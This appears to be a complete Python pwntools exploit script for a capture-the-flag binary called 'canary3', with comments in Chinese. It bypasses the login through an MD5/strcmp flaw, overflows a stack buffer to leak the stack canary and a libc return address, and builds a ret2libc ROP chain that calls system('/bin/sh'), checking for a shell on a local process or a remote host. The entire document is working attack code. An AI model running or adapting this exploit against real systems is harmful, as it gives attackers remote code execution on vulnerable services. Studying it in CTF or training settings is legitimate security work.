from pwn import *
import hashlib
import os

context.arch = "amd64"
context.log_level = "info"

MENU_END = b"3.exit\n"
BANNER = b"Do you know how to leak canary?"


def find_pw():
    """32 字节口令，使 md5(pw)[0] == 0x00。

    login: md5_init(ctx@rbp-0xe0); md5_update(ctx, pw@rbp-0x50, strlen(pw));
           md5_final(ctx, out@rbp-0x80)        # out 是 16 字节裸 digest
           strcmp(user, "admin") && strcmp(out, hex@rbp-0x30)
    口令读满 0x20 字节时 pw[0x20] = 0 打在 hex 首字节上，比较退化成
    strcmp(digest, "")：只要 digest[0] == 0 就登录成功。
    """
    for i in range(1 << 20):
        s = ("c3%06d" % i).encode().ljust(32, b".")[:32]
        if hashlib.md5(s).digest()[0] == 0:
            return s
    raise SystemExit("[-] no password found")


def login(p, pw):
    p.recvuntil(b"username: ")
    p.send(b"admin")
    p.recvuntil(b"password: ")
    p.send(pw)
    p.recvuntil(MENU_END)


def write(p, data):
    """选项 2：read(0, buf@rbp-0x20, 0x64)；buf 到 canary 只有 0x18 字节。"""
    p.sendline(b"2")
    p.recvuntil(b"your input:\n")
    p.send(data)
    p.recvuntil(MENU_END)


def leak_buf(p):
    """选项 1：printf("%s", buf@rbp-0x20)。"""
    p.sendline(b"1")
    raw = p.recvuntil(BANNER)
    p.recvuntil(MENU_END)
    return raw[: -len(BANNER)]


def libc_base_from_ret(ret_addr, libc):
    """从 main 的返回地址反推 libc 基址。

    main 的返回地址落在“调用 main 的那个函数”里，即 __libc_start_call_main
    (glibc>=2.34) 或 __libc_start_main 自身，两者相距不会超过一页多。
    libc 基址必然页对齐，所以候选偏移只能是 (ret_addr & 0xfff) + k*0x1000，
    在 __libc_start_main ± 0x2000 中挑最接近的即可，跨 glibc 版本都成立。
    """
    start = libc.address or 0                  # 本地时 pwntools 可能已填好
    sym = libc.sym["__libc_start_main"] - start  # 统一成文件内偏移
    low = ret_addr & 0xFFF
    best = None
    for k in range(0x40):
        off = low + k * 0x1000
        if sym - 0x2000 <= off <= sym + 0x2000:
            if best is None or abs(off - sym) < abs(best - sym):
                best = off
    if best is None:
        raise SystemExit(f"[-] cannot locate libc base: ret={ret_addr:#x} "
                         f"sym={sym:#x}")
    base = ret_addr - best
    assert base & 0xFFF == 0
    if start and start != base:
        raise SystemExit(f"[-] base mismatch: guess={base:#x} real={start:#x}")
    return base


def main(host=None, port=None):
    pw = find_pw()
    for attempt in range(8):
        if host is None:
            p = process("./canary3")
        else:
            p = remote(host, port)
        login(p, pw)
        libc = ELF(os.environ["LIBC"]) if os.environ.get("LIBC") else p.libc

        # 第 1 轮：只把 canary 的 0x00 低字节改成非零，printf 就能继续往后吐
        write(p, b"A" * 0x19)
        leak = leak_buf(p)
        if len(leak) < 0x20:
            log.warning(f"attempt {attempt}: canary leak truncated ({leak.hex()})")
            p.close()
            continue
        canary = b"\x00" + leak[0x19:0x20]
        log.info(f"attempt {attempt}: canary = {canary.hex()}")

        # 第 2 轮：canary 写回正确值，saved rbp 换成 0x42，把返回地址也吐出来
        write(p, b"A" * 0x19 + canary[1:] + b"B" * 8)
        leak = leak_buf(p)
        if len(leak) < 0x2E:
            log.warning(f"attempt {attempt}: ret leak truncated ({leak.hex()})")
            p.close()
            continue

        ret_addr = u64(leak[0x28:0x2E].ljust(8, b"\x00"))
        base = libc_base_from_ret(ret_addr, libc)
        libc.address = base
        log.success(f"canary = {canary.hex()}, ret = {ret_addr:#x} "
                    f"(libc+{ret_addr - base:#x}), libc = {base:#x}")

        rop = ROP(libc)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
        aligned = rop.find_gadget(["ret"]).address
        binsh = next(libc.search(b"/bin/sh\x00"))

        payload = flat(b"A" * 0x18, canary, b"C" * 8, aligned, pop_rdi, binsh,
                       libc.sym["system"])
        assert len(payload) <= 0x64, len(payload)

        # 第 3 轮：canary 正确 + ret2libc 链，然后走 exit 分支让 main return
        p.sendline(b"2")
        p.recvuntil(b"your input:\n")
        p.send(payload)
        p.recvuntil(MENU_END)
        p.sendline(b"3")
        p.sendline(b"echo __PWNED__; id; exit")
        out = p.recvrepeat(3.0)
        print(out.decode("utf-8", errors="replace"))
        if b"__PWNED__" in out:
            print("[+] shell ok")
            return True
        p.close()
    print("[-] exploit failed")
    return False


if __name__ == "__main__":
    # 用法：python 28_canary3_exp.py [LOCAL | <host> <port>]
    if len(sys.argv) > 2:
        main(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) > 1 and sys.argv[1] != "LOCAL":
        raise SystemExit("usage: python 28_canary3_exp.py [LOCAL | <host> <port>]")
    else:
        main()
